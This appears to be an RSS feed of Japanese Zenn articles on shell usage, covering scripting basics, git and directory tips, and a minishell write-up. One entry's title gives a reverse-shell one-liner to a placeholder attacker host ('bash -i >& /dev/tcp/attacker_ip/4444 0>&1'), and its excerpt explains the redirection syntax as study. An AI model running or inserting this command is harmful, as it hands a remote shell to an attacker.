<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[Zennの「shell」のフィード]]></title><description><![CDATA[Zennのトピック「shell」のRSSフィードです]]></description><link>https://zenn.dev/topics/shell</link><image><url>https://storage.googleapis.com/zenn-user-upload/topics/c8d33e6510.jpeg</url><title>Zennの「shell」のフィード</title><link>https://zenn.dev/topics/shell</link></image><generator>zenn.dev</generator><lastBuildDate>Fri, 30 May 2025 12:04:26 GMT</lastBuildDate><atom:link href="https://zenn.dev/topics/shell/feed" rel="self" type="application/rss+xml"/><language><![CDATA[ja]]></language><item><title><![CDATA[シェルスクリプトの基本その1]]></title><description><![CDATA[どうも、かりんです

 はじめに
これから作業を自動化したいと考えている方には、シェルスクリプトを覚えておくことをおすすめいたします。
業務で使用する場面もありますし、プライベートでもファイル処理などを効率化できるため、覚えておいて損はございません。
そのため、まずは基礎的な部分から順を追って記録していきます。

 シェルスクリプトとは何か
簡単に申し上げますと、ターミナルで使用するコマンドを並べて書いたファイルのことです。
たとえば、同じ操作を何度も繰り返しているような場合、それらをスクリプトとしてまとめておけば効率化につながります。

 スクリプトの作成と実行権限の付与
シェルスクリ...]]></description><link>https://zenn.dev/karin_lab/articles/2f199ea4051bb3</link><guid isPermaLink="true">https://zenn.dev/karin_lab/articles/2f199ea4051bb3</guid><pubDate>Fri, 30 May 2025 02:00:01 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--LGx2K-CK--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2582%25B7%25E3%2582%25A7%25E3%2583%25AB%25E3%2582%25B9%25E3%2582%25AF%25E3%2583%25AA%25E3%2583%2597%25E3%2583%2588%25E3%2581%25AE%25E5%259F%25BA%25E6%259C%25AC%25E3%2581%259D%25E3%2581%25AE1%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:%25E3%2581%258B%25E3%2582%258A%25E3%2582%2593%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyL2ZmNjQ5NDk1MzMuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>かりん</dc:creator></item><item><title><![CDATA[Macでランダムなパスワードを作成するワンライナー]]></title><description><![CDATA[LC_ALL=C tr -dc 'A-Za-z0-9!@#$%^&amp;*()-_=+' &lt; /dev/urandom | head -c 32; echo
出力例
ts;ClnPA_e&lt;ciz]f&lt;Rz6cYyy]@jMxG54
]]></description><link>https://zenn.dev/purratto/articles/0f61360b0c5be1</link><guid isPermaLink="true">https://zenn.dev/purratto/articles/0f61360b0c5be1</guid><pubDate>Tue, 27 May 2025 05:41:21 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--0j43lgg2--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:Mac%25E3%2581%25A7%25E3%2583%25A9%25E3%2583%25B3%25E3%2583%2580%25E3%2583%25A0%25E3%2581%25AA%25E3%2583%2591%25E3%2582%25B9%25E3%2583%25AF%25E3%2583%25BC%25E3%2583%2589%25E3%2582%2592%25E4%25BD%259C%25E6%2588%2590%25E3%2581%2599%25E3%2582%258B%25E3%2583%25AF%25E3%2583%25B3%25E3%2583%25A9%25E3%2582%25A4%25E3%2583%258A%25E3%2583%25BC%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:purratto%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzNhODdjNTc4MzguanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>purratto</dc:creator></item><item><title><![CDATA[mkdir -p と cd $_ でパッとディレクトリを立てて移動する]]></title><description><![CDATA[
 tl;dr
以下のコマンドで

指定したパスにディレクトリを作成する
ディレクトリに移動する
を一発で行えます。

mkdir -p &lt;new-folder-path&gt; &amp;&amp; cd $_

 あらまし
ぼくはプロジェクトを /github ディレクトリにまとめて管理しています。
.
└── github/
    ├── project-1
    ├── project-2
    └── project-3  
なので、毎回プロジェクトを立てるように以下のような手順でコマンドを実行しています。
cd github
mkdir new-project
c...]]></description><link>https://zenn.dev/ulxsth/articles/2224b97fd87c8e</link><guid isPermaLink="true">https://zenn.dev/ulxsth/articles/2224b97fd87c8e</guid><pubDate>Sun, 25 May 2025 15:27:01 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--LgpE7sRS--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:mkdir%2520-p%2520%25E3%2581%25A8%2520cd%2520%2524_%2520%25E3%2581%25A7%25E3%2583%2591%25E3%2583%2583%25E3%2581%25A8%25E3%2583%2587%25E3%2582%25A3%25E3%2583%25AC%25E3%2582%25AF%25E3%2583%2588%25E3%2583%25AA%25E3%2582%2592%25E7%25AB%258B%25E3%2581%25A6%25E3%2581%25A6%25E7%25A7%25BB%25E5%258B%2595%25E3%2581%2599%25E3%2582%258B%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:%25E3%2582%2588%25E3%2581%25A4%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyL2JiOGNiMGY2NjkuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>よつ</dc:creator></item><item><title><![CDATA[今いるディレクトリ下のどこかにあるファイルに一発で移動するシェルスクリプト]]></title><description><![CDATA[
 解決したかったこと
プロジェクトのルートにいるときに、例えば main.go とか compose.yml までのパスがパッとわからなくて、なんか cd &lt;Tab&gt; cd &lt;Tab&gt; でファイル一覧見ながら一階層ずつ移動したりすることありません？
もっというと go run ./... したら main.go のあるところにいなくて、いざたどり着いてもう一発 go run ./... したらローカル確認用のコンテナ立ててないのに気づいて compose.yml のところに移動・・・
みたいな、小さなストレス。特にバックエンドもフロントエンドも一つのリポジトリで...]]></description><link>https://zenn.dev/hikamayogoat/articles/770f1f94470f2f</link><guid isPermaLink="true">https://zenn.dev/hikamayogoat/articles/770f1f94470f2f</guid><pubDate>Sat, 24 May 2025 14:29:47 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--gn57d0Yt--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E4%25BB%258A%25E3%2581%2584%25E3%2582%258B%25E3%2583%2587%25E3%2582%25A3%25E3%2583%25AC%25E3%2582%25AF%25E3%2583%2588%25E3%2583%25AA%25E4%25B8%258B%25E3%2581%25AE%25E3%2581%25A9%25E3%2581%2593%25E3%2581%258B%25E3%2581%25AB%25E3%2581%2582%25E3%2582%258B%25E3%2583%2595%25E3%2582%25A1%25E3%2582%25A4%25E3%2583%25AB%25E3%2581%25AB%25E4%25B8%2580%25E7%2599%25BA%25E3%2581%25A7%25E7%25A7%25BB%25E5%258B%2595%25E3%2581%2599%25E3%2582%258B%25E3%2582%25B7%25E3%2582%25A7%25E3%2583%25AB%25E3%2582%25B9%25E3%2582%25AF%25E3%2583%25AA%25E3%2583%2597%25E3%2583%2588%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:Hikamayo%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzQ1MmI5ZDI0MDYuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>Hikamayo</dc:creator></item><item><title><![CDATA[nushellとstarshipで，コマンド履歴を残さないモードであることを可視化する]]></title><description><![CDATA[
 概要．

シェル・ターミナルで，履歴を残さないモードと通常モードの切り替えを容易にする．
コマンドエイリアスで，モード切り替えと同時に環境変数を設定する．
starshipで環境変数を参照して表示を切り替える．
nushell+starshipの環境で，履歴を残さないモードであることを可視化する．
nushell以外のシェルを使用している場合は（例：bash, zshなど），適宜読み替えてほしい．

成果物

履歴を残す状態のときのstarship表示

履歴を残さない状態のときのstarship表示

 環境

Ubuntu 24
nushell 0.104.0
starship ...]]></description><link>https://zenn.dev/neruneruna7/articles/6ccdd1b30b2b22</link><guid isPermaLink="true">https://zenn.dev/neruneruna7/articles/6ccdd1b30b2b22</guid><pubDate>Mon, 19 May 2025 13:03:50 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--6I-86mrs--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:nushell%25E3%2581%25A8starship%25E3%2581%25A7%25EF%25BC%258C%25E3%2582%25B3%25E3%2583%259E%25E3%2583%25B3%25E3%2583%2589%25E5%25B1%25A5%25E6%25AD%25B4%25E3%2582%2592%25E6%25AE%258B%25E3%2581%2595%25E3%2581%25AA%25E3%2581%2584%25E3%2583%25A2%25E3%2583%25BC%25E3%2583%2589%25E3%2581%25A7%25E3%2581%2582%25E3%2582%258B%25E3%2581%2593%25E3%2581%25A8%25E3%2582%2592%25E5%258F%25AF%25E8%25A6%2596%25E5%258C%2596%25E3%2581%2599%25E3%2582%258B%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:Neruneruna7%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EvQUdObXl4WjdHT1MzanlRM0dkTGt5WTNNZ2Ewdzl1WjVqcFdBRGJnTW92THQ9czk2LWM=%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>Neruneruna7</dc:creator></item><item><title><![CDATA[commandファイルをDockに固定したい 〜コピペでMacOSアプリを作っちゃおう〜]]></title><description><![CDATA[
 概要 〜なにをするのか〜
.commandファイルはシェルスクリプトでいろいろ自動化ができるので便利なんだ
例えば以下の2つとか。
https://qiita.com/GeneLab_999/items/4edc7bf5a2fa159feb5f
https://github.com/hiroki-abe-58/sort_files
しかし、これはDockに固定できないぞ、、、
これは、commandファイルを実行するためのラッパーとして機能する
シンプルなアプリを作ってしまおうという試みだ。
日頃行っている自動化シェルをDockから呼び出せるようになって便利なのだよ
Windowsの...]]></description><link>https://zenn.dev/rick_lyric/articles/9676adf233a7f0</link><guid isPermaLink="true">https://zenn.dev/rick_lyric/articles/9676adf233a7f0</guid><pubDate>Sun, 18 May 2025 05:53:09 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--5sSmeRSU--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:command%25E3%2583%2595%25E3%2582%25A1%25E3%2582%25A4%25E3%2583%25AB%25E3%2582%2592Dock%25E3%2581%25AB%25E5%259B%25BA%25E5%25AE%259A%25E3%2581%2597%25E3%2581%259F%25E3%2581%2584%2520%25E3%2580%259C%25E3%2582%25B3%25E3%2583%2594%25E3%2583%259A%25E3%2581%25A7MacOS%25E3%2582%25A2%25E3%2583%2597%25E3%2583%25AA%25E3%2582%2592%25E4%25BD%259C%25E3%2581%25A3%25E3%2581%25A1%25E3%2582%2583%25E3%2581%258A%25E3%2581%2586%25E3%2580%259C%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:GeneLab%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzhmMDIwOGRiNDQuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>GeneLab</dc:creator></item><item><title><![CDATA[ファイル整理自動化おすすめ手法]]></title><description><![CDATA[
 はじめに
写真愛好家やビデオグラファーの皆さん、こんな経験はありませんか？撮影から帰ってきた後、数百枚の写真や動画ファイルが無秩序に並んでいて整理に何時間も費やしてしまう…。私もその一人でした。そこで今回は、この問題を解決するための自作シェルスクリプトをご紹介します。
https://github.com/hiroki-abe-58/sort_files
このスクリプトは、ファイルのメタデータから撮影日時を自動的に読み取り、時間単位でフォルダを作成して分類してくれます。例えば、2025年4月1日の午後3時に撮影した全ての写真は 2025-04-01_15 というフォルダに自動的に移動...]]></description><link>https://zenn.dev/rick_lyric/articles/36edd49a4111a5</link><guid isPermaLink="true">https://zenn.dev/rick_lyric/articles/36edd49a4111a5</guid><pubDate>Sun, 18 May 2025 05:51:35 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--25doY1nH--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2583%2595%25E3%2582%25A1%25E3%2582%25A4%25E3%2583%25AB%25E6%2595%25B4%25E7%2590%2586%25E8%2587%25AA%25E5%258B%2595%25E5%258C%2596%25E3%2581%258A%25E3%2581%2599%25E3%2581%2599%25E3%2582%2581%25E6%2589%258B%25E6%25B3%2595%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:GeneLab%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzhmMDIwOGRiNDQuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>GeneLab</dc:creator></item><item><title><![CDATA[macOSのシェル設定をzsh以外にしている場合にCursor Agentにzsh以外を使わせる方法]]></title><description><![CDATA[皆さん、AIと仲良くやってますか。僕はCursor Agent + Gemini 2.5 Pro (Thinking)が妙に肌に合いまして、設計からコーディングまで、幅広い作業を任せております。
さて、Cursorに限ったことではありませんが、AIエージェントは必要に応じて様々な作業をやってくれます。コードの読み書きが主なものとなりますが、場合によってはシェル実行を伴うこともあります。
以前の筆者は「AIのことはそこまで信用してないので、シェル実行はコマンドだけ示してくれたらこっちでやるよ」というスタンスでした。しかしながら、少しずつAIと打ち解けてきて、そろそろシェルの実行も任せてもい...]]></description><link>https://zenn.dev/nkzn/articles/cursor-change-shell</link><guid isPermaLink="true">https://zenn.dev/nkzn/articles/cursor-change-shell</guid><pubDate>Sat, 17 May 2025 07:25:13 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--AnpBRvIS--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:macOS%25E3%2581%25AE%25E3%2582%25B7%25E3%2582%25A7%25E3%2583%25AB%25E8%25A8%25AD%25E5%25AE%259A%25E3%2582%2592zsh%25E4%25BB%25A5%25E5%25A4%2596%25E3%2581%25AB%25E3%2581%2597%25E3%2581%25A6%25E3%2581%2584%25E3%2582%258B%25E5%25A0%25B4%25E5%2590%2588%25E3%2581%25ABCursor%2520Agent%25E3%2581%25ABzsh%25E4%25BB%25A5%25E5%25A4%2596%25E3%2582%2592%25E4%25BD%25BF%25E3%2582%258F%25E3%2581%259B%25E3%2582%258B%25E6%2596%25B9%25E6%25B3%2595%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:Nkzn%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EtL0FPaDE0R2hpRkgxVktGMXZZOFk2eEtfZl9PVklHS2pEeWxkWG42MzVLU0VEZEE9czI1MC1j%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>Nkzn</dc:creator></item><item><title><![CDATA[macOS の open コマンドに渡すアプリ名をインタラクティブに選択する]]></title><description><![CDATA[macOS の open コマンドに -a オプションを渡すことで、対象のパスを指定した macOS のアプリケーションで開ける。
# カレントディレクトリを Visual Studio Code で開く
open . -a 'Visual Studio Code'
便利かどうかはさておき、この 'Visual Studio Code' の部分をインタラクティブに選択できないか試行錯誤した。
まずは macOS にインストールされているアプリを列挙するために、/Applications フォルダを ls コマンドで探索する apps コマンドを考える。
alias apps='\ls -...]]></description><link>https://zenn.dev/1000ch/articles/open-a-option-with-installed-apps</link><guid isPermaLink="true">https://zenn.dev/1000ch/articles/open-a-option-with-installed-apps</guid><pubDate>Fri, 16 May 2025 03:07:41 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--xV2Sdxlt--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:macOS%2520%25E3%2581%25AE%2520open%2520%25E3%2582%25B3%25E3%2583%259E%25E3%2583%25B3%25E3%2583%2589%25E3%2581%25AB%25E6%25B8%25A1%25E3%2581%2599%25E3%2582%25A2%25E3%2583%2597%25E3%2583%25AA%25E5%2590%258D%25E3%2582%2592%25E3%2582%25A4%25E3%2583%25B3%25E3%2582%25BF%25E3%2583%25A9%25E3%2582%25AF%25E3%2583%2586%25E3%2582%25A3%25E3%2583%2596%25E3%2581%25AB%25E9%2581%25B8%25E6%258A%259E%25E3%2581%2599%25E3%2582%258B%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:%25401000ch%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzFlZDJmOTVmZGMuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>@1000ch</dc:creator></item><item><title><![CDATA[git のサブコマンドを任意のディレクトリで実行する]]></title><description><![CDATA[git のサブコマンドを使った git リポジトリの操作は、そのディレクトリ配下で行うことが多いが、-C オプション[1]で git リポジトリのパスを指定することで任意のディレクトリで実行できる。
git -C path/to/git/repository pull origin main
例えばホームディレクトリ配下に git clone でクローンしたツールを更新する場合に、cd で移動して git pull でリモートのコミットを取得し、元のディレクトリに移動するという手順を考える。ここでは nodenv をホームディレクトリにクローンしている例を挙げる。
# ホームディレクトリ...]]></description><link>https://zenn.dev/1000ch/articles/git-c-option</link><guid isPermaLink="true">https://zenn.dev/1000ch/articles/git-c-option</guid><pubDate>Thu, 15 May 2025 00:47:08 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--vwyXzAUv--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:git%2520%25E3%2581%25AE%25E3%2582%25B5%25E3%2583%2596%25E3%2582%25B3%25E3%2583%259E%25E3%2583%25B3%25E3%2583%2589%25E3%2582%2592%25E4%25BB%25BB%25E6%2584%258F%25E3%2581%25AE%25E3%2583%2587%25E3%2582%25A3%25E3%2583%25AC%25E3%2582%25AF%25E3%2583%2588%25E3%2583%25AA%25E3%2581%25A7%25E5%25AE%259F%25E8%25A1%258C%25E3%2581%2599%25E3%2582%258B%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:%25401000ch%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzFlZDJmOTVmZGMuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>@1000ch</dc:creator></item><item><title><![CDATA[GitHubActions 複数のCodeDeployのデプロイを新コンテナが立ち上がるまで待機するためのShell芸]]></title><description><![CDATA[GitHubActionsでCodeDeployのデプロイを行い、新コンテナが立ち上がるまで待機したい...しかも複数環境...なんてことはないでしょうか？
私はあります、そんなときに使えるShell芸を紹介します。

 コード例
name: example workflow

on:
  workflow_call:
    inputs:
      ENVIRONMENT:
        required: true
        type: string
      AWS_REGION:
        required: false
        type: strin...]]></description><link>https://zenn.dev/smartcamp/articles/e4d77a3550c3ea</link><guid isPermaLink="true">https://zenn.dev/smartcamp/articles/e4d77a3550c3ea</guid><pubDate>Mon, 12 May 2025 12:36:48 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--b0IokFBF--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:GitHubActions%2520%25E8%25A4%2587%25E6%2595%25B0%25E3%2581%25AECodeDeploy%25E3%2581%25AE%25E3%2583%2587%25E3%2583%2597%25E3%2583%25AD%25E3%2582%25A4%25E3%2582%2592%25E6%2596%25B0%25E3%2582%25B3%25E3%2583%25B3%25E3%2583%2586%25E3%2583%258A%25E3%2581%258C%25E7%25AB%258B%25E3%2581%25A1%25E4%25B8%258A%25E3%2581%258C%25E3%2582%258B%25E3%2581%25BE%25E3%2581%25A7%25E5%25BE%2585%25E6%25A9%259F%25E3%2581%2599%25E3%2582%258B%25E3%2581%259F%25E3%2582%2581%25E3%2581%25AEShell%25E8%258A%25B8%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_34:%25E8%2581%25B7%25E4%25BA%25BA%2Cx_220%2Cy_108/bo_3px_solid_rgb:d6e3ed%2Cg_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzUyNGYwMGIzM2MuanBlZw==%2Cr_20%2Cw_90%2Cx_92%2Cy_102/co_rgb:6e7b85%2Cg_south_west%2Cl_text:notosansjp-medium.otf_30:SMARTCAMP%2520Engineer%2520Blog%2Cx_220%2Cy_160/bo_4px_solid_white%2Cg_south_west%2Ch_50%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyL2JmYWFlYjUwNDguanBlZw==%2Cr_max%2Cw_50%2Cx_139%2Cy_84/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>職人</dc:creator></item><item><title><![CDATA[bash -i >& /dev/tcp/attacker_ip/4444 0>&1の解釈]]></title><description><![CDATA[リバースシェルの構文について1週間くらい悩んでいたのでメモ。

bash -i

対話形式(-i)のbashを起動

コマンド &gt;&amp; ファイル名

Aの標準出力と標準エラー出力をBに送る。
!
コマンド &gt;&amp; ファイル名とあるが、コマンド 1&gt;ファイル名 2&gt;&amp;1と同義。コマンド &amp;&gt; ファイル名でも可
なお2&gt;&amp;1のようなリダイレクトは、2, &gt;&amp;, 1に分解できるようなものではなく、2&gt;&amp;1で一つの塊なので注意。分解できる前提で考えるとコマンド &gt;&amp; ファイル名の&g...]]></description><link>https://zenn.dev/tttttttttt/articles/54cdfd7c537c51</link><guid isPermaLink="true">https://zenn.dev/tttttttttt/articles/54cdfd7c537c51</guid><pubDate>Fri, 09 May 2025 14:13:53 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--xBxTzKbt--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:bash%2520-i%2520%253E%2526%2520%252Fdev%252Ftcp%252Fattacker_ip%252F4444%25200%253E%25261%25E3%2581%25AE%25E8%25A7%25A3%25E9%2587%2588%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:tttttttttt%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyL2IxZTcyNjQ1MWMuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>tttttttttt</dc:creator></item><item><title><![CDATA[シェルにおけるクオートと$括弧]]></title><description><![CDATA[
 シングルクオート '

囲んだ中身を、そのままの文字列として扱う。$VAR のような変数や、コマンドの実行結果の出力を行わない。
echo '$PATH'
# $PATH

 ダブルクオート "

囲んだ中身の、変数やコマンドの実行結果を出力する。特殊文字は、一部 ($, ```, \, " 等) を除き文字列として扱う。
echo "$PATH"

 バッククオート `　と $()

囲んだ中身をコマンドとして実行し、その結果を出力する。
echo `pwd`
# /Users/1000ch/workspace/github.com/1000ch/zenn

echo $(base...]]></description><link>https://zenn.dev/1000ch/articles/quotes-and-braces-in-shell</link><guid isPermaLink="true">https://zenn.dev/1000ch/articles/quotes-and-braces-in-shell</guid><pubDate>Sat, 03 May 2025 13:47:13 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--2Q-oFfRv--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2582%25B7%25E3%2582%25A7%25E3%2583%25AB%25E3%2581%25AB%25E3%2581%258A%25E3%2581%2591%25E3%2582%258B%25E3%2582%25AF%25E3%2582%25AA%25E3%2583%25BC%25E3%2583%2588%25E3%2581%25A8%2524%25E6%258B%25AC%25E5%25BC%25A7%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:%25401000ch%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzFlZDJmOTVmZGMuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>@1000ch</dc:creator></item><item><title><![CDATA[Linuxのジョブとプロセスの関係を理解しよう]]></title><description><![CDATA[Linux学習時にジョブとプロセスの概念が理解できなかったため、初学者向けに執筆しました。
Linux環境で効率的に作業を行うには、ジョブとプロセスの概念と関係性を理解することが重要です。本記事では、ジョブとプロセスの基本から応用まで、実用的な知識を解説します。

 目次

プロセスとジョブの基本概念
ジョブコントロールの基本コマンド
プロセス管理コマンド
実践的な使用例
まとめ


 プロセスとジョブの基本概念

 プロセスとは
プロセスはLinuxシステム上で実行されるプログラムのインスタンスです。各プロセスには：

一意のプロセスID（PID）
親プロセス（PPID）
実行優先度
...]]></description><link>https://zenn.dev/mt_trero53/articles/4ad7ed56760a78</link><guid isPermaLink="true">https://zenn.dev/mt_trero53/articles/4ad7ed56760a78</guid><pubDate>Fri, 02 May 2025 03:55:56 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--DlEf7vRs--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:Linux%25E3%2581%25AE%25E3%2582%25B8%25E3%2583%25A7%25E3%2583%2596%25E3%2581%25A8%25E3%2583%2597%25E3%2583%25AD%25E3%2582%25BB%25E3%2582%25B9%25E3%2581%25AE%25E9%2596%25A2%25E4%25BF%2582%25E3%2582%2592%25E7%2590%2586%25E8%25A7%25A3%25E3%2581%2597%25E3%2582%2588%25E3%2581%2586%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:mt_trero53%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzhmMTM4YTMxZjAuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>mt_trero53</dc:creator></item><item><title><![CDATA[[C言語 shellの再実装] minishell振り返り 後編]]></title><description><![CDATA[
 はじめに
前回の続きです。

 学んだこと

 5.リダイレクトの実行
リダイレクトとは例えば以下のようなコマンドです。
$ echo "Hello" &gt; test.txt
$ cat test.txt
Hello
普通、echoコマンドは標準出力に出力しますが、例では'&gt;'で指定した'test.txt'というファイルに出力をして(書き込んだ)、その後'cat'コマンドでファイルの中身を出力しています。
リダイレクトとはこのように「入出力の示す先を変えること」です。
これがどのようにして実装されるのか以下にその基本を示します。
まずはリダイレクトなしのコードとその実行結果...]]></description><link>https://zenn.dev/kodyi/articles/b26544764fac43</link><guid isPermaLink="true">https://zenn.dev/kodyi/articles/b26544764fac43</guid><pubDate>Wed, 30 Apr 2025 12:34:07 GMT</pubDate><enclosure 